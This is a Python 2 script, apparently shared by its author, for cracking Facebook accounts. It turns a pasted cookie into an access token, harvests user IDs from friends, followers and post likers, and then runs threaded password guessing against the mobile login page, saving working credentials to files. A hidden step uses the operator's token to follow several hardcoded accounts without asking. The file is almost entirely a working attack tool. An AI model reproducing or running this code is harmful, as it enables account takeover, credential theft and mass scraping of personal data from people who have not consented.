#!/usr/bin/python2
# coding=utf-8
# code by The-Rebel
# Facebook : Facebook.com/Rehan khan

import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
import os,sys,uuid,time,datetime,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,bs4
from multiprocessing.pool import ThreadPool
from datetime import date

def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')

try:
        import mechanize
except ImportError:
        os.system("pip2 install mechanize")
try:
        import requests
except ImportError:
        os.system("pip2 install requests bs4")
        os.system("python2 supreme.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime

hm = [('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]')]

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', hm)]
s = requests.Session()
api = 'https://graph.facebook.com/{}'
hea = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'}

if ("linux" in sys.platform.lower()):

        N = '\x1b[0m'
        G = '\x1b[32m'
        O = '\x1b[37m\x1b[33m'
        R = '\x1b[91m'
else:

        N = ''
        G = ''
        O = ''
        R = ''

def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)

def banner():
	os.system('echo -e "              ______  _____  ___  ______  _______\n             / __/ / / / _ \/ _ \/ __/  |/  / __/\n            _\ \/ /_/ / ___/ , _/ _// /|_/ / _/\n           /___/\____/_/  /_/|_/___/_/  /_/___/\n            \n               Coded By : The-Rebel \n─────────────────────────────────────────────────────────────" | lolcat')

pw = False
back = 0
loop = 0
threads = []
ok = []
cp = []
id = []
Successful = []
Checkpoint = []
done = []
pw = []
target = []

def login():
    os.system('clear')
    banner()
    print ("\n   [ Choose Login Methode ]")
    print ("\n   [•] Login With Cookies")
    print ("   [•] Login With Token")
    print ("   [•] Update Script")
    choose_login()

def choose_login():
    log = raw_input("\n   [•] Choose : ")
    if log=="":
        print("   [!] Fill In The Correct")
        login()
    elif log=="1":
        log_cookies()
    elif log=="2":
        log_token()
    elif log=="3":
        update_script()
    else:
        print("   [!] Fill In The Correct")
        login()

def log_cookies():
    os.system('clear')
    banner()
    cookie = raw_input("\n   [•] Cookies : ")
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
        'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
        'referer'                   : 'https://m.facebook.com/',
        'host'                      : 'm.facebook.com',
        'origin'                    : 'https://m.facebook.com',
        'upgrade-insecure-requests' : '1',
        'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control'             : 'max-age=0',
        'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'content-type'              : 'text/html; charset=utf-8'
        }, cookies = {
        'cookie'                    : cookie
        })
        find_token = re.search('(EAAA\w+)', data.text)
        hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
            print "   [!] No Connection"
    cookie = open("login.txt", 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    jalan('\n   [•] Login Successful')
    bot_follow()

def log_token():
    os.system('clear')
    banner()
    toket = raw_input("\n   [•] Token : ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        jalan('\n   [•] Login Successful')
        bot_follow()
    except KeyError:
        print ("   [!] Token Invalid")
        os.system('clear')
        login()
        
def bot_follow():
    try:
		toket=open('login.txt','r').read()
    except IOError:
		print("   [!] Token Invalid")
        	os.system('rm -rf login.txt')
        	menu()
    requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
    requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
    requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
    requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
    requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
    requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket) #Angga Kurniawan
    options()
    
def options():
        os.system('clear')
        banner()
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print "\n   [!] Cookies/Token Invalid"
		os.system('rm -rf login.txt')
		os.system('clear')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print "\n   [!] Cookies/Token Invalid"
		os.system('rm -rf login.txt')
		os.system('clear')
		login()
	except requests.exceptions.ConnectionError:
		print "\n   [!] No Connection"
		exit()
        os.system('clear')
        banner()
        print ("\n   [•] Welcome "+nama)
        print ("   [•] Your ID : "+id)
        os.system('echo -e "\n─────────────────────────────────────────────────────────────" | lolcat')
        print ("\n   [ Choose An Options ]\n")
        print ("\n   [1] Dump ID From Friend")
        print ("   [2] Dump ID From Public")
        print ("   [3] Dump ID Followers")
        print ("   [4] Dump ID Likers Post")
        print ("   [5] Start Crack")
        print ("   [6] Log Out")
        choose_options()

def choose_options():
    opt = raw_input("\n   [•] Choose : ")
    if opt=="":
        print("   [!] Fill In The Correct")
        options()
    elif opt=="1":
        dump_friend()
    elif opt=="2":
        dump_public()
    elif opt=="3":
        dump_followers()
    elif opt=="4":
        dump_likers()
    elif opt=="5":
        crack()
    elif opt=="6":
        update_script()
    else:
        print("   [!] Fill In The Correct")
        options()

def dump_friend():
        os.system('clear')
        banner()
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ih = raw_input("\n   [•] File Name : ")
        if ih in [""]:
        	exit("   [!] Don't Empty")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".json","w")
        try:
            for i in s.get(api.format("me/friends?access_token=%s"%(toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r   [•] Total Dump : %s"%(len(id)
                    ));sys.stdout.flush()
            wrt.close()
            print("\n   [•] Success Dump ID From Friend")
            print("   [•] File Saved At : dump/%s.json "%(ih))
            raw_input("\n   [ Back ]")
            options()
        except OSError:
            exit("   [!] Dump Failed")

def dump_public():
        os.system('clear')
        banner()
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ah = raw_input("\n   [•] ID Public Target : ")
	jok = requests.get("https://graph.facebook.com/"+ah+"?access_token="+toket)
	op = json.loads(jok.text)
        ih = op['first_name'].replace(" ","_")
        if ah in [""]:
        	exit("   [!] Don't Empty")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".json","w")
        try:
            for i in  s.get(api.format("%s/friends?limit=10000&access_token=%s"%(ah,toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r   [•] Mohon Tunggu Lagi Dump ID %s "%(len(id)
                    ));sys.stdout.flush()
            wrt.close()
            print("\n   [•] Success Dump ID From Public")
            print("   [•] File Saved At : dump/%s.json "%(ih))
            raw_input("\n   [ Back ]")
            options()
        except OSError:
            exit("   [!] Dump Failed")

def dump_followers():
        os.system('clear')
        banner()
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ih = raw_input("\n   [•] ID Followers Target : ")
        ah = raw_input("   [•] File Name           : ")
        if ih in [""]:
        	exit("   [!] Don't Empty")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ah+".json","w")
        try:
            for i in  s.get(api.format("%s/subscribers?limit=10000&access_token=%s"%(ih,toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r   [•] Mohon Tunggu Lagi Dump ID %s "%(len(id)
                    ));sys.stdout.flush()
            wrt.close()
            print("\n   [•] Success Dump ID From Followers")
            print("   [•] File Saved At : dump/%s.json "%(ah))
            raw_input("\n   [ Back ]")
            options()
        except OSError:
            exit("   [!] Dump Failed")

def dump_likers():
        os.system('clear')
        banner()
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ah = raw_input("\n   [•] ID Post Target : ")
        ih = raw_input("   [•] File Name      : ")
        if ah in [""]:
        	exit("   [!] Don't Empty")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".json","w")
        try:
            for i in  s.get(api.format("%s/likes?limit=10000&access_token=%s"%(ah,toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r   [•] Mohon Tunggu Lagi Dump ID %s "%(len(id)
                    ));sys.stdout.flush()
            wrt.close()
            print("\n   [•] Success Dump ID From Likers Post")
            print("   [•] File Saved At : dump/%s.json "%(ih))
            raw_input("\n   [ Back ]")
            options()
        except OSError:
                exit("   [!] Dump Failed")

# CRACK API
def crack():
        os.system('clear')
        banner()
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ask = raw_input("\n   [•] Crack With Password Default/Manual [d/m]? : ")
        if ask.lower() == "m":
                manual()
        file=raw_input("   [•] File Name : ")
        if file in [""]:
        	exit("   [!] Don't Empty")
        try:
                fil = open(file,"r").readlines()
                for id in fil:
                        target.append(id.strip())
        except Exception as e:
        	print("\n   [!] Wrong File Name")
        	pass
        os.system('echo -e "\n   [•] Crack Started...\n   [•] Account [OK] Saved to : ok.txt\n   [•] Account [CP] Saved to : cp.txt\n" | lolcat')
        try:
                os.mkdir("crack")
        except:
                pass
        m=ThreadPool(30)
        m.map(crack1_mbasic,target)
        results(Successful,Checkpoint)
        exit()

def crack1_mbasic(user):
	global loop
	try:
		a = s.get(api.format('%s?access_token=%s' % (user, toket)), headers=hea).json()
		dp = a['first_name'].lower()
		bk = a['last_name'].lower()
		tl = a['birthday']
		for pw in [dp,dp+'123',dp+'12345','sayang','anjing','bangsat','123456','bismillah','kontol','rahasia']:
			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\r\x1b[0;32m   [OK] ' +user+ ' • ' +pw+ ' • ' +tl+ '         '
				Successful.append(user+' • '+pw)
				save = open('ok.txt','a')
				save.write(str(user)+' • '+str(pw)+'\n')
				save.close()
				break
			elif 'checkpoint' in xo:
				print '\r\x1b[0;33m   [CP] ' +user+ ' • ' +pw+ ' • ' +tl+ '         '
				Checkpoint.append(user+' • '+pw)
				save = open('cp.txt','a')
				save.write(str(user)+' • '+str(pw)+'\n')
				save.close()
				break
				try:
				  loop += 1
				  print "\r\x1b[0;37m   [Crack] %s/%s - ok-:%s - cp-:%s "%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
				except:continue
	except:
	  pass

def manual():
        global pw,loop
        try:
                idt = raw_input("   [•] File Name : ")
                for id in open(idt,"r").readlines():
                        target.append(id.strip())
        except KeyError:
                exit("   [!] File Does Not Exist")
        print ("   [•] Example : sayang,bismillah,123456")
        pw = raw_input("   [•] Password : ").split(",")
        if len(pw) ==0:
                exit("   [!] Dont Empty")
        os.system('echo -e "\n   [•] Crack Started...\n   [•] Account [OK] Saved to : ok.txt\n   [•] Account [CP] Saved to : cp.txt\n" | lolcat')
        try:
                os.mkdir("crack")
        except:
                pass
        m=ThreadPool(30)
        m.map(cs,target)
        results(Successful,Checkpoint)
        exit()

def cs(user):
	global loop,pw
	try:	
		for i in pw:
			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': i, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print "\r\x1b[0;32m   [OK]  %s • %s %s • %s              "%(user,i,I,tl)
				Successful.append(user+' • '+i)
				save = open('ok.txt','a')
				save.write(str(user)+' • '+str(i)+'\n')
				save.close()
				break
			elif 'checkpoint' in xo:
				print "\r\x1b[0;33m   [CP]  %s • %s %s • %s             "%(user,i,I,tl)
				Checkpoint.append(user+' • '+i)
				save = open('cp.txt','a')
				save.write(str(user)+' • '+str(i)+'\n')
				save.close()
				break
				try:
				  loop += 1
				  print "\r\x1b[0;37m   [Crack] %s/%s - ok-:%s - cp-:%s "%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
				except:continue
	except:
	  pass
def results(Successful,Checkpoint):
        if len(Successful) !=0:
                print ("\n   [OK] : "+str(len(Successful)))
        if len(Checkpoint) !=0:
                print ("\n   [CP] : "+str(len(Checkpoint)))
        if len(Successful) ==0 and len(Checkpoint) ==0:
                print "\n"
                print ("   [!] No Result Found")
    
if __name__=='__main__':
	try:
		token = open("login.txt").read() 
		options() 
	except IOError:
		print "   Token Invalid"
		login()
	login()
